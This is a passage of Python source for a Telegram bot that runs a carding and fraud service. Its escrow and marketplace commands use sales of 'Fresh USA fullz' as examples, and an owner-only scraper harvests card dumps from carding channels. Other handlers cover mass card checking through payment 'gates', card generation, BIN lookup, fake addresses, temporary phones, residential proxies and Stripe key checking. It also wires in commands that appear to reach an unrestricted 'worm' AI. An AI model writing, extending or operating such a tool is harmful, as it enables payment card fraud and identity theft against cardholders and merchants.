                "<code>/reseller remove &lt;id&gt;</code>",
                parse_mode=ParseMode.HTML,
            )
    else:
        info = get_reseller_info(user_id)
        if not info:
            await update.message.reply_text("❌ You are not a reseller.", parse_mode=ParseMode.HTML)
            return
        clients = get_clients(user_id)
        await update.message.reply_text(
            ae("🏪 <b>Reseller Dashboard</b>") + "\n\n"
            f"🆔 Your ID: <code>{user_id}</code>\n"
            f"👥 Clients: <b>{len(clients)}</b> / {info.get('credit_limit', 0)}\n"
            f"💰 Commission: <b>{info.get('commission_pct', 0)}%</b>\n\n"
            "Use <code>/addclient &lt;user_id&gt; &lt;credit_limit&gt;</code> to add clients.",
            parse_mode=ParseMode.HTML,
        )


async def cmd_addclient(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reseller: add a client (/addclient user_id credit_limit)."""
    user_id = update.effective_user.id
    reseller = get_reseller_info(user_id)
    if not reseller and not is_owner(user_id):
        await update.message.reply_text("❌ Only resellers can add clients.", parse_mode=ParseMode.HTML)
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "👤 <b>Add Client</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/addclient &lt;user_id&gt; &lt;credit_limit&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>user_id</code> — Telegram ID of the client to add\n"
            "• <code>credit_limit</code> — Max credits this client can use\n\n"
            "<b>Example:</b>\n"
            "<code>/addclient 123456789 200</code>\n\n"
            "💡 You must be a registered reseller to use this.",
            parse_mode=ParseMode.HTML,
        )
        return
    try:
        client_id = int(context.args[0])
        credit_limit = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid arguments.", parse_mode=ParseMode.HTML)
        return
    ok = add_client(user_id, client_id, credit_limit)
    if ok:
        await update.message.reply_text(f"✅ Client <code>{client_id}</code> added with {credit_limit} credit limit.", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("❌ Failed to add client. Check your client limit.", parse_mode=ParseMode.HTML)


async def cmd_escrow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Escrow: create or manage escrow deals (/escrow create <amount> <description>)."""
    user_id = update.effective_user.id
    sub = context.args[0].lower() if context.args else "menu"

    if sub == "create":
        if len(context.args) < 3:
            await update.message.reply_text(
                "Usage: <code>/escrow create &lt;amount&gt; &lt;description&gt;</code>",
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            amount = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Amount must be a number.", parse_mode=ParseMode.HTML)
            return
        desc = " ".join(context.args[2:])
        result = create_deal(user_id, amount, desc)
        if not result or "error" in result:
            err = result.get("error", "Unknown error") if result else "Database error"
            await update.message.reply_text(f"❌ {html_escape(err)}", parse_mode=ParseMode.HTML)
            return
        deal_id = result["deal_id"]
        await update.message.reply_text(
            ae("🤝 <b>Escrow Deal Created</b>") + "\n\n"
            f"🆔 Deal ID: <code>{deal_id}</code>\n"
            f"💰 Amount: <b>{amount}</b> credits (locked)\n"
            f"📋 Description: {html_escape(desc)}\n\n"
            "Share the deal ID with the seller. They use:\n"
            f"<code>/escrow join {deal_id}</code>",
            parse_mode=ParseMode.HTML,
        )

    elif sub == "join":
        if len(context.args) < 2:
            await update.message.reply_text(
                "🤝 <b>Join Escrow Deal</b>\n\n"
                "<b>Usage:</b> <code>/escrow join &lt;deal_id&gt;</code>\n\n"
                "<b>Example:</b> <code>/escrow join 42</code>\n\n"
                "The buyer shares the deal ID with you.",
                parse_mode=ParseMode.HTML,
            )
            return
        deal_id = context.args[1]
        ok, msg_txt = join_deal(deal_id, user_id)
        await update.message.reply_text(
            ("✅ " if ok else "❌ ") + html_escape(msg_txt),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "confirm":
        if len(context.args) < 2:
            await update.message.reply_text(
                "✅ <b>Confirm Escrow Deal</b>\n\n"
                "<b>Usage:</b> <code>/escrow confirm &lt;deal_id&gt;</code>\n\n"
                "<b>Example:</b> <code>/escrow confirm 42</code>\n\n"
                "⚠️ Only confirm when you have received the goods.\n"
                "This releases the locked credits to the seller.",
                parse_mode=ParseMode.HTML,
            )
            return
        deal_id = context.args[1]
        ok, msg_txt = confirm_deal(deal_id, user_id)
        await update.message.reply_text(
            ("✅ " if ok else "❌ ") + html_escape(msg_txt),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "dispute":
        if len(context.args) < 2:
            await update.message.reply_text(
                "⚠️ <b>Open Escrow Dispute</b>\n\n"
                "<b>Usage:</b> <code>/escrow dispute &lt;deal_id&gt;</code>\n\n"
                "<b>Example:</b> <code>/escrow dispute 42</code>\n\n"
                "The owner will review and resolve the dispute.",
                parse_mode=ParseMode.HTML,
            )
            return
        deal_id = context.args[1]
        ok, msg_txt = dispute_deal(deal_id, user_id)
        await update.message.reply_text(
            ("⚠️ " if ok else "❌ ") + html_escape(msg_txt),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "resolve" and is_owner(user_id):
        if len(context.args) < 3:
            await update.message.reply_text(
                "⚖️ <b>Resolve Escrow Dispute</b>\n\n"
                "<b>Usage:</b> <code>/escrow resolve &lt;deal_id&gt; &lt;buyer|seller&gt;</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>deal_id</code> — The deal ID in dispute\n"
                "• <code>buyer|seller</code> — Who wins the dispute\n\n"
                "<b>Example:</b> <code>/escrow resolve 42 seller</code>\n\n"
                "👑 Owner only.",
                parse_mode=ParseMode.HTML,
            )
            return
        deal_id = context.args[1]
        winner = context.args[2].lower()
        if winner not in ("seller", "buyer"):
            await update.message.reply_text("❌ Winner must be 'seller' or 'buyer'.", parse_mode=ParseMode.HTML)
            return
        ok, msg_txt = admin_resolve_deal(deal_id, winner)
        await update.message.reply_text(
            ("✅ " if ok else "❌ ") + html_escape(msg_txt),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "list":
        deals = get_user_deals(user_id)
        if not deals:
            await update.message.reply_text("No escrow deals found.", parse_mode=ParseMode.HTML)
            return
        lines = [
            f"• <code>{d.get('id','?')}</code> — {d.get('credits', 0)} cr | {d.get('status', '?')} | {html_escape(str(d.get('desc', ''))[:40])}"
            for d in deals[:10]
        ]
        await update.message.reply_text(
            ae("🤝 <b>Your Escrow Deals</b>") + "\n\n" + "\n".join(lines),
            parse_mode=ParseMode.HTML,
        )

    elif sub == "disputes" and is_owner(user_id):
        deals = get_disputed_deals()
        if not deals:
            await update.message.reply_text("No disputed deals.", parse_mode=ParseMode.HTML)
            return
        lines = [
            f"• <code>{d.get('id','?')}</code> — {d.get('credits', 0)} cr | {html_escape(str(d.get('desc', ''))[:40])}"
            for d in deals[:10]
        ]
        await update.message.reply_text(
            ae("⚠️ <b>Disputed Deals</b>") + "\n\n" + "\n".join(lines),
            parse_mode=ParseMode.HTML,
        )

    else:
        await update.message.reply_text(
            "🤝 <b>Escrow — Secure Credit Trades</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/escrow create &lt;amount&gt; &lt;description&gt;</code>\n"
            "<code>/escrow join &lt;deal_id&gt;</code>\n"
            "<code>/escrow confirm &lt;deal_id&gt;</code>\n"
            "<code>/escrow dispute &lt;deal_id&gt;</code>\n"
            "<code>/escrow list</code>\n"
            "<code>/escrow resolve &lt;deal_id&gt; buyer|seller</code>  ← owner\n\n"
            "<b>How it works:</b>\n"
            "1️⃣ Buyer creates a deal — credits are locked\n"
            "2️⃣ Seller joins the deal with the deal ID\n"
            "3️⃣ Buyer confirms delivery — credits released\n"
            "4️⃣ Either party can open a dispute if needed\n\n"
            "<b>Example:</b>\n"
            "<code>/escrow create 500 Fullz pack x10</code>",
            parse_mode=ParseMode.HTML,
        )


async def cmd_hibpwatch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """HIBP breach watcher: watch/unwatch emails (/hibpwatch add|remove|list <email>)."""
    @require_approval
    async def _inner(update, context):
        user_id = update.effective_user.id
        sub = context.args[0].lower() if context.args else "list"

        if sub == "add":
            if len(context.args) < 2:
                await update.message.reply_text(
                    "👁 <b>Watch Email for Breaches</b>\n\n"
                    "<b>Usage:</b> <code>/hibpwatch add &lt;email&gt;</code>\n\n"
                    "<b>Example:</b> <code>/hibpwatch add victim@gmail.com</code>",
                    parse_mode=ParseMode.HTML,
                )
                return
            email = context.args[1]
            result = add_watch(user_id, email)
            if isinstance(result, tuple):
                ok, msg_txt = result
            else:
                ok, msg_txt = bool(result), "Added" if result else "Failed"
            await update.message.reply_text(("✅ " if ok else "❌ ") + html_escape(msg_txt), parse_mode=ParseMode.HTML)

        elif sub == "remove":
            if len(context.args) < 2:
                await update.message.reply_text(
                    "👁 <b>Remove Email Watch</b>\n\n"
                    "<b>Usage:</b> <code>/hibpwatch remove &lt;email&gt;</code>\n\n"
                    "<b>Example:</b> <code>/hibpwatch remove victim@gmail.com</code>",
                    parse_mode=ParseMode.HTML,
                )
                return
            email = context.args[1]
            ok = remove_watch(user_id, email)
            await update.message.reply_text("✅ Watch removed." if ok else "❌ Not found.", parse_mode=ParseMode.HTML)

        elif sub == "list":
            watches = get_user_watches(user_id)
            if not watches:
                await update.message.reply_text("You have no email watches. Use <code>/hibpwatch add &lt;email&gt;</code>", parse_mode=ParseMode.HTML)
                return
            lines = [f"• <code>{w.get('email', w) if isinstance(w, dict) else w}</code>" for w in watches]
            await update.message.reply_text(
                ae("👁 <b>HIBP Email Watches</b>") + "\n\n" + "\n".join(lines),
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(
                "👁 <b>HIBP Breach Watcher</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/hibpwatch add &lt;email&gt;</code>\n"
                "<code>/hibpwatch remove &lt;email&gt;</code>\n"
                "<code>/hibpwatch list</code>\n\n"
                "<b>Subcommands:</b>\n"
                "• <code>add</code> — Start watching an email for breaches\n"
                "• <code>remove</code> — Stop watching an email\n"
                "• <code>list</code> — Show all your watched emails\n\n"
                "<b>Examples:</b>\n"
                "<code>/hibpwatch add victim@gmail.com</code>\n"
                "<code>/hibpwatch remove victim@gmail.com</code>\n\n"
                "⚠️ Max 5 emails per user.\n"
                "You will be alerted automatically when a new breach is detected.",
                parse_mode=ParseMode.HTML,
            )
    await _inner(update, context)


async def cmd_scraper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Channel card scraper: add/remove/list channels (/scraper add|remove|list|stats)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    sub = context.args[0].lower() if context.args else "list"

    admin_id = update.effective_user.id
    if sub == "add":
        if len(context.args) < 2:
            await update.message.reply_text(
                "📡 <b>Add Scraper Channel</b>\n\n"
                "<b>Usage:</b> <code>/scraper add @channel</code>\n\n"
                "<b>Example:</b> <code>/scraper add @cardingchannel</code>\n\n"
                "⚠️ The bot must be an admin in the channel to see messages.",
                parse_mode=ParseMode.HTML,
            )
            return
        channel = context.args[1].lstrip("@")
        ok = add_channel(channel, added_by=admin_id)
        await update.message.reply_text(f"✅ Channel @{channel} added." if ok else f"❌ Could not add @{channel}.", parse_mode=ParseMode.HTML)

    elif sub == "remove":
        if len(context.args) < 2:
            await update.message.reply_text(
                "📡 <b>Remove Scraper Channel</b>\n\n"
                "<b>Usage:</b> <code>/scraper remove @channel</code>\n\n"
                "<b>Example:</b> <code>/scraper remove @cardingchannel</code>",
                parse_mode=ParseMode.HTML,
            )
            return
        channel = context.args[1].lstrip("@")
        ok = remove_channel(channel)
        await update.message.reply_text(f"✅ Channel @{channel} removed." if ok else f"❌ Not found.", parse_mode=ParseMode.HTML)

    elif sub == "list":
        channels = get_active_channels()
        if not channels:
            await update.message.reply_text("No channels in scraper.", parse_mode=ParseMode.HTML)
            return
        lines = [f"• @{c}" if isinstance(c, str) else f"• @{c.get('channel', '?')}" for c in channels]
        await update.message.reply_text(ae("📡 <b>Scraper Channels</b>") + "\n\n" + "\n".join(lines), parse_mode=ParseMode.HTML)

    elif sub == "stats":
        stats_list = get_scraper_stats()
        cards = sum(s.get('found', 0) for s in stats_list) if stats_list else 0
        active_count = sum(1 for s in stats_list if s.get('active')) if stats_list else 0
        per_channel = "\n".join(
            f"  • @{s.get('channel','?')}: {s.get('found',0)} cards {'✅' if s.get('active') else '❌'}"
            for s in (stats_list or [])[:8]
        ) or "  No channels"
        await update.message.reply_text(
            ae("📊 <b>Scraper Stats</b>") + "\n\n"
            f"📡 Active channels: <b>{active_count}</b>\n"
            f"💳 Total cards found: <b>{cards}</b>\n\n"
            f"{per_channel}",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            "📡 <b>Channel Card Scraper</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/scraper add @channel</code>\n"
            "<code>/scraper remove @channel</code>\n"
            "<code>/scraper list</code>\n"
            "<code>/scraper stats</code>\n\n"
            "<b>Subcommands:</b>\n"
            "• <code>add</code> — Monitor a channel for card dumps\n"
            "• <code>remove</code> — Stop monitoring a channel\n"
            "• <code>list</code> — Show all monitored channels\n"
            "• <code>stats</code> — Cards found per channel\n\n"
            "<b>Example:</b>\n"
            "<code>/scraper add @cardingchannel</code>\n\n"
            "⚠️ Bot must be admin in the channel.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )


async def cmd_marketplace(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show marketplace info (/marketplace)."""
    await update.message.reply_text(
        ae("🛍 <b>Marketplace</b>") + "\n\n"
        "List and browse items for sale using credits.\n\n"
        "<b>Commands:</b>\n"
        "/market list — Browse listings\n"
        "/market sell &lt;price&gt; &lt;item&gt; — Create listing\n"
        "/market buy &lt;listing_id&gt; — Purchase item\n"
        "/market mylistings — Your active listings",
        parse_mode=ParseMode.HTML,
    )


async def cmd_market(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Marketplace: list/sell/buy/mylistings (/market <sub> ...)."""
    user_id = update.effective_user.id
    sub = context.args[0].lower() if context.args else "list"

    er = _mdb()
    _ensure_marketplace_table()
    import uuid as _uuid

    if sub == "sell":
        if len(context.args) < 3:
            await update.message.reply_text(
                "🏷 <b>Create Marketplace Listing</b>\n\n"
                "<b>Usage:</b>\n"
                "<code>/market sell &lt;price_credits&gt; &lt;description&gt;</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>price_credits</code> — How many credits to charge\n"
                "• <code>description</code> — What you're selling\n\n"
                "<b>Example:</b>\n"
                "<code>/market sell 200 Fresh USA fullz x10</code>",
                parse_mode=ParseMode.HTML,
            )
            return
        try:
            price = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Price must be a number.", parse_mode=ParseMode.HTML)
            return
        item_desc = " ".join(context.args[2:])
        listing_id = _uuid.uuid4().hex[:8].upper()
        er(
            "INSERT INTO marketplace_listings(listing_id, seller_id, price, description, status) VALUES(%s,%s,%s,%s,'active')",
            (listing_id, user_id, price, item_desc),
        )
        await update.message.reply_text(
            ae("🏷 <b>Listing Created</b>") + "\n\n"
            f"📋 Item: {html_escape(item_desc)}\n"
            f"💰 Price: <b>{price}</b> credits\n"
            f"🆔 Listing ID: <code>{listing_id}</code>",
            parse_mode=ParseMode.HTML,
        )

    elif sub == "list":
        rows = er("SELECT listing_id, seller_id, price, description FROM marketplace_listings WHERE status='active' LIMIT 20", fetch=True)
        if not rows:
            await update.message.reply_text("No active listings.", parse_mode=ParseMode.HTML)
            return
        lines = [f"• <code>{r[0]}</code> — {str(r[3])[:40]} | {r[2]} cr (by <code>{r[1]}</code>)" for r in (rows or [])]
        await update.message.reply_text(ae("🛍 <b>Marketplace Listings</b>") + "\n\n" + "\n".join(lines), parse_mode=ParseMode.HTML)

    elif sub == "buy":
        if len(context.args) < 2:
            await update.message.reply_text(
                "🛍 <b>Buy Listing</b>\n\n"
                "<b>Usage:</b> <code>/market buy &lt;listing_id&gt;</code>\n\n"
                "<b>Arguments:</b>\n"
                "• <code>listing_id</code> — The 8-character code from the listing\n\n"
                "<b>Example:</b> <code>/market buy A1B2C3D4</code>\n\n"
                "💡 Use <code>/market list</code> to see available listings.",
                parse_mode=ParseMode.HTML,
            )
            return
        listing_id = context.args[1].upper()
        row = er("SELECT seller_id, price, description FROM marketplace_listings WHERE listing_id=%s AND status='active'", (listing_id,), fetch=True, fetch_one=True)
        if not row:
            await update.message.reply_text("❌ Listing not found or sold.", parse_mode=ParseMode.HTML)
            return
        seller_id, price, desc = row
        if seller_id == user_id:
            await update.message.reply_text("❌ Cannot buy your own listing.", parse_mode=ParseMode.HTML)
            return
        bal = get_balance(user_id)
        if bal < price:
            await update.message.reply_text(f"❌ Insufficient credits. You have {bal}, need {price}.", parse_mode=ParseMode.HTML)
            return
        ok, msg_txt = transfer_credits(user_id, seller_id, price)
        if ok:
            er("UPDATE marketplace_listings SET status='sold', buyer_id=%s WHERE listing_id=%s", (user_id, listing_id))
            await update.message.reply_text(
                ae("✅ <b>Purchase Successful!</b>") + "\n\n"
                f"📋 Item: {html_escape(str(desc))}\n"
                f"💰 Paid: {price} credits",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(f"❌ Purchase failed: {msg_txt}", parse_mode=ParseMode.HTML)

    elif sub == "mylistings":
        rows = er("SELECT listing_id, price, description, status FROM marketplace_listings WHERE seller_id=%s LIMIT 10", (user_id,), fetch=True)
        if not rows:
            await update.message.reply_text("You have no listings.", parse_mode=ParseMode.HTML)
            return
        lines = [f"• <code>{r[0]}</code> — {str(r[2])[:35]} | {r[1]} cr | {r[3]}" for r in (rows or [])]
        await update.message.reply_text(ae("📦 <b>My Listings</b>") + "\n\n" + "\n".join(lines), parse_mode=ParseMode.HTML)

    else:
        await update.message.reply_text(
            "🛒 <b>Marketplace</b>\n\n"
            "<b>Usage:</b>\n"
            "<code>/market list</code>  ← browse all listings\n"
            "<code>/market sell &lt;price&gt; &lt;description&gt;</code>  ← create listing\n"
            "<code>/market buy &lt;listing_id&gt;</code>  ← purchase a listing\n"
            "<code>/market mylistings</code>  ← your active listings\n\n"
            "<b>Example:</b>\n"
            "<code>/market sell 200 Fresh USA fullz x10</code>\n"
            "<code>/market buy A1B2C3D4</code>",
            parse_mode=ParseMode.HTML,
        )


async def cmd_geterror(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send the error log file to the owner (/geterror)."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return

    import io, datetime

    log_path = ERROR_LOG_FILE
    subcommand = (context.args[0].lower() if context.args else "").strip()

    # /geterror clear — wipe the log
    if subcommand == "clear":
        try:
            open(log_path, "w").close()
            await update.message.reply_text("🗑 <b>Error log cleared.</b>", parse_mode=ParseMode.HTML)
        except Exception as e:
            await update.message.reply_text(f"❌ Could not clear log: {e}")
        return

    # Read log file
    try:
        with open(log_path, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()
    except FileNotFoundError:
        await update.message.reply_text(
            "📭 <b>No errors logged yet.</b>\n\nThe error log is empty — great sign! 🎉",
            parse_mode=ParseMode.HTML,
        )
        return
    except Exception as e:
        await update.message.reply_text(f"❌ Could not read log: {e}")
        return

    if not content.strip():
        await update.message.reply_text(
            "📭 <b>Error log is empty.</b>\n\nNo errors recorded since last clear. 🎉",
            parse_mode=ParseMode.HTML,
        )
        return

    # Keep only the last 500 lines to stay within Telegram's 50 MB document limit
    lines = content.splitlines()
    total_lines = len(lines)
    MAX_LINES = 500
    if total_lines > MAX_LINES:
        lines = lines[-MAX_LINES:]
        truncated = True
    else:
        truncated = False

    output = "\n".join(lines)
    now = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"bot_errors_{now}.txt"

    header = (
        f"📋 Error Log — {now}\n"
        f"Total lines: {total_lines}"
        + (f" (showing last {MAX_LINES})" if truncated else "")
        + "\n" + "=" * 60 + "\n\n"
    )
    file_bytes = (header + output).encode("utf-8")

    caption = (
        f"📋 <b>Error Log</b>\n"
        f"Lines: <code>{total_lines}</code>"
        + (f" (last {MAX_LINES} shown)" if truncated else "")
        + f"\nSize: <code>{len(file_bytes) // 1024} KB</code>\n\n"
        f"<i>Use</i> <code>/geterror clear</code> <i>to wipe the log.</i>"
    )

    await update.message.reply_document(
        document=io.BytesIO(file_bytes),
        filename=filename,
        caption=caption,
        parse_mode=ParseMode.HTML,
    )


async def cmd_proxy_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show residential proxy pool info (/proxyinfo)."""
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner only.", parse_mode=ParseMode.HTML)
        return
    proxy = get_random_proxy()
    if proxy:
        await update.message.reply_text(
            ae("🌐 <b>Residential Proxy Pool</b>") + "\n\n"
            f"✅ Pool active\n"
            f"🔁 Sample proxy: <code>{proxy.split('@')[-1] if '@' in proxy else proxy}</code>",
            parse_mode=ParseMode.HTML,
        )
    else:
        await update.message.reply_text(
            ae("🌐 <b>Residential Proxy Pool</b>") + "\n\n"
            "❌ No residential proxies available.\n"
            "Add proxies via the admin panel or /addproxy command.",
            parse_mode=ParseMode.HTML,
        )


def _deposit_checker_loop():
    import time as _time
    while True:
        try:
            _time.sleep(120)
            from modules.cc_shop import check_pending_deposits
            confirmed = check_pending_deposits()
            if confirmed > 0:
                print(f"[Deposit Checker] Confirmed {confirmed} deposit(s)")
        except Exception as e:
            print(f"[Deposit Checker] Error: {e}")


def main():
    """Start the bot"""
    print("=" * 80)
    print("🎀 ONICHAN BOT - Starting...")
    print("🎨 Hot Sexy Anime GIFs 4K Edition")
    print("=" * 80)

    import threading

    # ── Start Flask/keep_alive FIRST so the health-check probe always gets a
    #    200 response within ~1 second, regardless of how long other init takes.
    if REPLIT_MODE:
        print("🌐 Starting keep_alive server for Replit...")
        keep_alive()
        print("✅ Keep_alive server started!")

        # Start public tunnel so Twilio webhooks can reach us from the internet.
        # The riker.replit.dev dev domain resolves to 127.0.0.2 (Replit-internal
        # only), so Twilio's servers cannot reach it. localtunnel gives us a real
        # public HTTPS URL stored in /tmp/webhook_tunnel_url.
        try:
            import time as _t
            _t.sleep(1)  # give Flask a moment to bind
            from modules.twilio_call import start_tunnel
            _tunnel_url = start_tunnel(port=5000)
            if _tunnel_url:
                print(f"🌍 Twilio webhook tunnel: {_tunnel_url}")
            else:
                print("⚠️ Tunnel not ready — Twilio voice calls may fail")
        except Exception as _te:
            print(f"⚠️ Tunnel start error: {_te}")

    deposit_thread = threading.Thread(target=_deposit_checker_loop, daemon=True)
    deposit_thread.start()
    print("💰 Deposit checker background thread started")

    # Warm the GIF cache in a background thread so it never blocks startup
    gif_cache_thread = threading.Thread(target=_preload_gif_cache, daemon=True)
    gif_cache_thread.start()

    try:
        from modules.proxy_scraper_engine import start_scraper_thread
        start_scraper_thread(interval_minutes=10)
        print("🕷️ Proxy scraper background thread started")
    except Exception as e:
        print(f"⚠️ Proxy scraper start failed: {e}")

    try:
        from modules.proxy_nodes import start_node_poller
        start_node_poller()
        print("📡 VPS node poller background thread started")
    except Exception as e:
        print(f"⚠️ Node poller start failed: {e}")

    try:
        from modules.proxy_shop import start_rotating_refresh_thread
        start_rotating_refresh_thread(interval_minutes=30)
        print("🔄 Rotating proxy auto-refresh thread started")
    except Exception as e:
        print(f"⚠️ Rotating refresh start failed: {e}")
    
    # Force delete webhook before starting (fix for conflict issues)
    import requests as req
    try:
        resp = req.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true")
        if resp.status_code == 200:
            print("🔄 Cleared webhook and pending updates")
    except:
        pass
    
    # Initialize Supabase (async)
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        supabase_result = loop.run_until_complete(init_supabase_async())
        if supabase_result:
            print("🗄️ Supabase: Connected")
        else:
            print("🗄️ Supabase: Not configured (using file storage)")
    except Exception as e:
        print(f"🗄️ Supabase: Error - {e}")
    
    # Ensure database files exist (fallback)
    ensure_database_files()

    # Initialize new module tables
    try:
        init_credits_tables()
        print("💰 Credits tables initialized")
    except Exception as _e:
        print(f"⚠️ Credits tables: {_e}")
    try:
        init_reseller_tables()
        print("👥 Reseller tables initialized")
    except Exception as _e:
        print(f"⚠️ Reseller tables: {_e}")
    try:
        init_escrow_tables()
        print("🤝 Escrow tables initialized")
    except Exception as _e:
        print(f"⚠️ Escrow tables: {_e}")
    try:
        init_monitor_tables()
        print("📊 Gate monitor tables initialized")
    except Exception as _e:
        print(f"⚠️ Gate monitor tables: {_e}")
    try:
        init_scraper_tables()
        print("📡 Scraper tables initialized")
    except Exception as _e:
        print(f"⚠️ Scraper tables: {_e}")
    try:
        init_hibp_tables()
        print("👁 HIBP tables initialized")
    except Exception as _e:
        print(f"⚠️ HIBP tables: {_e}")

    if OWNER_ID == 0:
        print("⚠️  WARNING: OWNER_ID not set in config.py!")
        print("   Get your ID from @userinfobot and update config.py")
    else:
        print(f"👑 Owner ID: {OWNER_ID}")
    
    print(f"🔒 Access Control: {'Enabled' if REQUIRE_APPROVAL else 'Disabled'}")
    print("=" * 80)
    
    # Create application with concurrent updates enabled for parallel user processing
    # Increase connection pool and timeouts for handling many simultaneous users
    from telegram.ext import Defaults
    from telegram.request import HTTPXRequest
    
    request = HTTPXRequest(
        connection_pool_size=100,  # Allow 100 concurrent connections
        read_timeout=30.0,
        write_timeout=30.0,
        connect_timeout=15.0,
        pool_timeout=30.0
    )
    
    async def _on_startup(app):
        import concurrent.futures
        loop = asyncio.get_running_loop()
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=200)
        loop.set_default_executor(executor)
        print("🔧 Thread pool set to 200 workers for concurrent card checking")
        from config import TON_WALLET
        await _ton_monitor.start_monitor(TON_WALLET, app.bot, set_premium_sync)

    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)  # Handle multiple users simultaneously
        .request(request)
        .post_init(_on_startup)
        .build()
    )
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("cmds", help_command))
    application.add_handler(CommandHandler("proxy", unified_proxy_command))
    application.add_handler(CommandHandler("scrapeproxy", proxy_scraper))
    application.add_handler(CommandHandler("freeproxy", proxy_scraper))
    application.add_handler(CommandHandler("ipcheck", ipcheck_command))
    application.add_handler(CommandHandler("gen", card_generator))
    application.add_handler(CommandHandler("bin", bin_lookup))
    application.add_handler(CommandHandler("fake", fake_address_generator))
    application.add_handler(CommandHandler("download", download_command))
    application.add_handler(CommandHandler("dl", download_command))
    application.add_handler(CommandHandler("tmail", tempmail_generate))
    application.add_handler(CommandHandler("tpno", temp_phone_command))
    application.add_handler(CommandHandler("ip", ip_check_command))
    application.add_handler(CommandHandler("ipscore", ip_check_command))
    application.add_handler(CommandHandler("sk", sk_check_command))
    application.add_handler(CommandHandler("skinfo", sk_check_command))
    application.add_handler(CommandHandler("ckproxy", proxy_check_command))
    application.add_handler(CommandHandler("proxycheck", proxy_check_command))
    application.add_handler(CommandHandler("proxymode", lambda u, c: _proxy_toggle_mode(u.message, u.effective_user.id, " ".join(c.args).strip() if c.args else "")))
    application.add_handler(CommandHandler("tempphone", temp_phone_command))
    application.add_handler(CommandHandler("ask", ask_command))
    application.add_handler(CommandHandler("ai", ask_command))
    application.add_handler(CommandHandler("gpt", ask_command))
    application.add_handler(CommandHandler("askill", askill_command))
    application.add_handler(CommandHandler("worm", askill_command))
    application.add_handler(CommandHandler("img", img_command))
    application.add_handler(CommandHandler("image", img_command))
    application.add_handler(CommandHandler("gen", img_command))
    application.add_handler(CommandHandler("unimg", unimg_command))
    application.add_handler(CommandHandler("nsfw", unimg_command))
    application.add_handler(CommandHandler("music", music_command))
    application.add_handler(CommandHandler("suno", music_command))
    application.add_handler(CommandHandler("randi", randi_command))
    application.add_handler(CommandHandler("blackbox", randi_command))
    application.add_handler(CommandHandler("revrs", reverse_search_command))
    application.add_handler(CallbackQueryHandler(temp_phone_callback, pattern="^tpno_"))
    application.add_handler(CommandHandler("cmail", tempmail_check))
    application.add_handler(MessageHandler(filters.Regex(r'^/rmail_'), tempmail_read))
    application.add_handler(CommandHandler("web", web_analyzer_command))
    application.add_handler(CommandHandler("config", user_config_command))
    application.add_handler(CommandHandler("setmail", setmail_command))
    application.add_handler(CommandHandler("capkey", capkey_command))
    
    # CC Cleaner & Scraper handlers
    application.add_handler(CommandHandler("clean", clean_cc_file))
    application.add_handler(CommandHandler("filter", filter_cc_command))
    application.add_handler(CommandHandler("scr", cc_scraper))
    
    # Mass check handlers
    application.add_handler(CommandHandler("mass", mass_check))
    
    # Unified document handler (handles all TXT file scenarios)
    async def unified_document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all TXT file uploads based on context"""
        # Check for mass check TXT shortcut
        if 'mass_check_gate' in context.user_data:
            await handle_mass_check_txt_file(update, context)
            return
        
        # Check for filter operation
        if 'cc_filter' in context.user_data:
            await handle_filter_file(update, context)
            return
        
        # Default: regular TXT file extraction
        await handle_txt_file(update, context)
    
    application.add_handler(MessageHandler(filters.Document.TXT, unified_document_handler))
    
    # Mass check shortcuts (mpp, mss, etc.)
    application.add_handler(CommandHandler("mpp", lambda u, c: mass_check_shortcut(u, c, "pp")))
    application.add_handler(CommandHandler("mss", lambda u, c: mass_check_shortcut(u, c, "ss")))
    application.add_handler(CommandHandler("mbu", lambda u, c: mass_check_shortcut(u, c, "bu")))
    application.add_handler(CommandHandler("msq", lambda u, c: mass_check_shortcut(u, c, "sq")))
    application.add_handler(CommandHandler("msor", lambda u, c: mass_check_shortcut(u, c, "sor")))
    application.add_handler(CommandHandler("mstr", mass_str))
    application.add_handler(CommandHandler("mstm", lambda u, c: mass_check_shortcut(u, c, "stm")))
    
    # Mass check TXT file shortcuts - Free gates
